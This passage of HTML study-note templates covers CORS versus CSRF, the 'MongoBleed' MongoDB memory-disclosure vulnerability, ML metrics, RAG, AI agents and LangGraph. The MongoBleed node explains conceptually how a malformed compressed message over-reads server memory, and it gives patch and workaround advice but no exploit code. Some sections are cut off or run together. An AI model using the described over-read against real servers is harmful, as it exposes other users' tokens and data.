<div class="info"><strong>CORS vs CSRF:</strong> CORS = browser access control for cross-origin <em>reads</em>. CSRF = forged <em>writes</em>. Different attacks, both matter. <code>Access-Control-Allow-Origin: *</code> cannot be combined with <code>Allow-Credentials: true</code>.</div>
</template>

<template id="node-11-03" data-type="node" data-trail="trail-11" data-order="3"
  data-title="MongoBleed: A Real-World Exploit"
  data-file="MongoBleed.md"
  data-bridge="MongoBleed is a server exploit that leaks secrets straight out of an unencrypted wire protocol. That points at the deeper question every secure channel answers first: how do two parties who have never met agree on a secret over a hostile network, and prove who they are? Asymmetric cryptography &mdash; RSA, Diffie-Hellman, elliptic curves &mdash; is the mathematical foundation.">
<h3>The Vulnerability</h3>
<pre>
  CVE-2025-14847: "MongoBleed"
  Type: Unauthenticated Memory Disclosure
  Component: MongoDB Wire Protocol — zlib compression handling

  What the attacker needs:  IP address + port 27017
                             NO username, NO password, NO connection string</pre>
<h3>How It Works</h3>
<pre>
  Normal compressed message:
  ┌────────────────────────────────────────┐
  │  [zlib compressed payload, N bytes]   │
  └────────────────────────────────────────┘
  Server decompresses → processes command ✓

  Malformed message (attack):
  ┌────────────────────────────────────────┐
  │  [claims N bytes, actually M &lt; N]     │
  └────────────────────────────────────────┘
  Server tries to read N bytes from M-byte buffer
  → reads PAST the buffer (over-read)
  → returns raw server memory: other users' data,
    session tokens, API keys</pre>
<h3>Risk Assessment</h3>
<table>
  <thead><tr><th>Exposure</th><th>Risk</th></tr></thead>
  <tbody>
    <tr><td>Port 27017 open to public internet</td><td>Critical — automated scanners exploit within minutes</td></tr>
    <tr><td>MongoDB inside private VPC/firewall</td><td>Medium — safe from direct attack; vulnerable to lateral movement</td></tr>
  </tbody>
</table>
<h3>Remediation</h3>
<ul>
  <li><strong>Patch immediately</strong>: MongoDB 7.0.28+, 6.0.27+, or 5.0.31+</li>
  <li><strong>Workaround</strong> (if can't patch): disable zlib in <code>mongod.conf</code>: <code>compressors: snappy,zstd</code></li>
  <li><strong>Best practice always</strong>: never expose port 27017 to the internet; whitelist allowed IPs only</li>
</ul>
<div class="info">The vulnerability is in the Wire Protocol layer — not your application code. Patching requires updating the MongoDB server binary itself. The driver handles compression transparently; you may not know zlib is in use.</div>
</template>

<template id="node-12-01" data-type="node" data-trail="trail-12" data-order="1"
  data-title="Confusion Matrix, L1 and L2 Regularization"
  data-file="AI-ML/Confusion Matrix, L1, L2.md"
  data-bridge="Before deploying any model, you need metrics to evaluate it. With the evaluation vocabulary in hand, the next question is how to make a general LLM useful in a specific domain — RAG, fine-tuning, and CAG each answer that differently.">
<h3>Confusion Matrix</h3>
<pre>
  Actual \ Predicted │  Positive  │  Negative
  ───────────────────┼────────────┼─────────────────
  Positive           │  TP ✓      │  FN ✗  (Type II)
  Negative           │  FP ✗      │  TN ✓
                     (Type I)</pre>
<h3>Derived Metrics</h3>
<table>
  <thead><tr><th>Metric</th><th>Formula</th><th>Use when FP/FN cost is high</th></tr></thead>
  <tbody>
    <tr><td>Accuracy</td><td>(TP+TN)/(TP+TN+FP+FN)</td><td>Balanced classes</td></tr>
    <tr><td>Precision</td><td>TP/(TP+FP)</td><td>False positives are costly (spam, fraud detection)</td></tr>
    <tr><td>Recall</td><td>TP/(TP+FN)</td><td>False negatives are costly (cancer, security alerts)</td></tr>
    <tr><td>F1-Score</td><td>2 × (P×R)/(P+R)</td><td>Balance both (harmonic mean)</td></tr>
    <tr><td>Specificity</td><td>TN/(TN+FP)</td><td>True negative rate</td></tr>
  </tbody>
</table>
<h3>L1 vs L2 Regularisation</h3>
<div class="compare">
  <div><h4>L1 (Lasso)</h4><pre>Loss + λ × Σ|wᵢ|
Drives weights to EXACTLY zero
→ feature selection
→ sparse model</pre></div>
  <div><h4>L2 (Ridge)</h4><pre>Loss + λ × Σwᵢ²
Shrinks weights TOWARDS zero
→ all features kept
→ handles correlated features</pre></div>
</div>
<ul>
  <li><strong>λ</strong> (lambda): regularisation strength — higher = simpler model, lower = fits training data more</li>
  <li>Purpose: prevent overfitting by penalising model complexity</li>
</ul>
</template>

<template id="node-12-02" data-type="node" data-trail="trail-12" data-order="2"
  data-title="LLMs: Fine-Tuning, RAG, and CAG"
  data-file="AI-ML/LLMs- Fine Tuning, RAG.md"
  data-bridge="RAG retrieves knowledge; AI Agents go further — they use LLMs to reason about goals, choose tools, and act. This note covers the evolution from compound AI systems to autonomous agents using the ReAct pattern.">
<h3>Three Approaches</h3>
<pre>
  BASE LLM → general knowledge, training cutoff, no domain expertise

  FINE-TUNING:
    Training on domain-specific labelled examples
    → updates model WEIGHTS
    → domain knowledge baked in permanently
    Fast inference (no retrieval) | Expensive to retrain

  RAG (Retrieval-Augmented Generation):
    Offline: chunk docs → embed → vector DB
    Online:  query → embed → retrieve top-K → inject into prompt → generate
    Dynamic data | Transparent sources | Easy to update index

  CAG (Cache-Augmented Generation):
    Preload entire knowledge base into context window
    → cached as KV pairs in GPU memory
    → queries answered from cache (no retrieval step)
    Fast | Limited by context window size</pre>
<h3>Comparison</h3>
<table>
  <thead><tr><th></th><th>Fine-Tuning</th><th>RAG</th><th>CAG</th></tr></thead>
  <tbody>
    <tr><td>Knowledge location</td><td>Model weights</td><td>External vector DB</td><td>Context / KV cache</td></tr>
    <tr><td>Update when data changes</td><td>Full retrain (expensive)</td><td>Update index (easy)</td><td>Recompute KV cache</td></tr>
    <tr><td>Inference speed</td><td>Fast (no retrieval)</td><td>Slower (retrieval step)</td><td>Fast (no retrieval)</td></tr>
    <tr><td>Source citations?</td><td>No</td><td>Yes</td><td>Possible</td></tr>
    <tr><td>Best for</td><td>Domain tone/style</td><td>Dynamic, large knowledge</td><td>Small, static knowledge</td></tr>
  </tbody>
</table>
<div class="info">This second brain is a variant of RAG/CAG — Claude reads your vault notes to tailor explanations to your existing knowledge. Hybrid: fine-tune for domain language + RAG for current data = best of both.</div>
</template>

<template id="node-12-03" data-type="node" data-trail="trail-12" data-order="3"
  data-title="AI Agents"
  data-file="AI-ML/AI Agents.md"
  data-bridge="Agents need a standard way to connect to external tools and data. MCP (Model Context Protocol) is that standard — a client-server design that separates the smart client (LLM) from the dumb executor (tool server).">
<h3>Evolution</h3>
<pre>
  MONOLITHIC MODEL:
    LLM input → LLM → output
    Limited to training data. Cannot take actions.

  COMPOUND AI SYSTEM:
    LLM + data retrieval + tools (pre-defined workflow)
    e.g. RAG: LLM + vector DB
    Can access external data but workflow is hardcoded.

  AI AGENT:
    LLM CONTROLS the logic:
    - Reasons about what to do next
    - Chooses which tool to call
    - Acts on the result
    - Loops until task is complete
    The LLM is no longer a component — it IS the controller.</pre>
<h3>Agent Capabilities</h3>
<table>
  <thead><tr><th>Capability</th><th>What it means</th></tr></thead>
  <tbody>
    <tr><td>Reasoning</td><td>Create a plan; break complex goals into sub-tasks</td></tr>
    <tr><td>Acting</td><td>Call external tools (search, DB, calculator, API, code exec)</td></tr>
    <tr><td>Memory</td><td>In-context (recent history), external (stored past interactions via RAG)</td></tr>
  </tbody>
</table>
<h3>ReAct Pattern (Reason + Act)</h3>
<pre>
  User: "How much sunscreen for Florida vacation?"

  Thought: I need vacation length, weather, and dosage info.
  Act: get_vacation_length(user_id) → 7 days
  Thought: I need Florida weather forecast.
  Act: weather_api(location="Florida", days=7) → UV index 9
  Thought: I need sunscreen dosage for UV 9.
  Act: search("SPF 50 dose UV 9 per day") → 2 oz, every 2 hrs
  Thought: Calculate.
  Answer: 7 days × 4 apps/day × 2 oz = ~56 oz. Pack 4 bottles.</pre>
<ul>
  <li>Programmatic approaches better for narrow, well-defined tasks; agentic approaches for complex, open-ended tasks</li>
  <li>Autonomy is a slider: low = LLM suggests, human approves; high = LLM decides and acts</li>
</ul>
</template>

  └──────────────────────────┬──────────────────────────────────┘

  └─────────────────────────────────────────────────────────────┘</pre>

<template id="node-12-05" data-type="node" data-trail="trail-12" data-order="5"
  data-title="LangGraph Flow"
  data-file="AI-ML/Langgraph Flow.md"
  data-bridge="With the mechanics of LLMs and agents understood, Karpathy's essay reframes the entire picture: what does this paradigm shift mean for how software is built, and for your role as an engineer?">
<h3>Why LangGraph</h3>
<div class="compare">
  <div><h4>Legacy (while loop)</h4><pre>while round_count &lt; max:
    content, tools = llm.generate(...)
    if not tools: break
    for call in tools:
        execute_tool(call) # manual
    round_count += 1
→ becomes spaghetti as flows
  grow complex</pre></div>
  <div><h4>LangGraph (declarative graph)</h4><pre>init_context → add_message
    → evaluate_templates → llm
                            │
                     tool_calls?
                        ↓  ↑
                      tools ─┘
                        │
                       END
Flow IS the structure ✓</pre></div>
</div>
<h3>Core Concepts</h3>
<table>
  <thead><tr><th>Concept</th><th>What it is</th></tr></thead>
  <tbody>
    <tr><td>StateGraph</td><td>The graph container; parameterised by a TypedDict schema</td></tr>

<h3>Three Eras of Software</h3>
<table>
  <thead><tr><th>Era</th><th>How software is created</th><th>Example</th></tr></thead>
  <tbody>
    <tr><td>Software 1.0</td><td>Human-written code (explicit logic + rules)</td><td>Tesla autopilot early code</td></tr>

  </tbody>
</table>
<h3>LLMs as Utilities, Fabs, and Operating Systems</h3>
<pre>
  AS UTILITIES:   High capex (GPU clusters), metered API access,
                  requires high uptime — like electricity or cloud infra

  AS FABS:        Enormous capital investment ($100B+ GPU clusters),
                  rapid tech change — like semiconductor fabrication

  AS OPERATING SYSTEMS:
    LLM = the CPU (executes instructions)
    Context window = RAM (working memory)
    Closed-source (GPT, Claude) ↔ Open-source (Llama, Mistral)
    "We are in the 1960s mainframe era" — expensive, centralised</pre>
<h3>LLM Psychology</h3>
<div class="compare">
  <div><h4>Superpowers</h4><ul><li>Encyclopedic knowledge</li><li>Instant recall</li><li>Multilingual</li><li>Patient, tireless</li></ul></div>
  <div><h4>Cognitive deficits</h4><ul><li>Hallucination</li><li>Jagged intelligence (superhuman some areas, fails basic maths)</li><li>Anterograde amnesia (no persistent memory)</li><li>Gullibility (prompt injection)</li></ul></div>
</div>
<h3>Key Properties of Well-Designed LLM Apps</h3>
<ol>

  <li><strong>Orchestration</strong>: multiple specialised LLMs for different tasks</li>
  <li><strong>Auditable GUI</strong>: application-specific interface so humans can review what the LLM is doing</li>
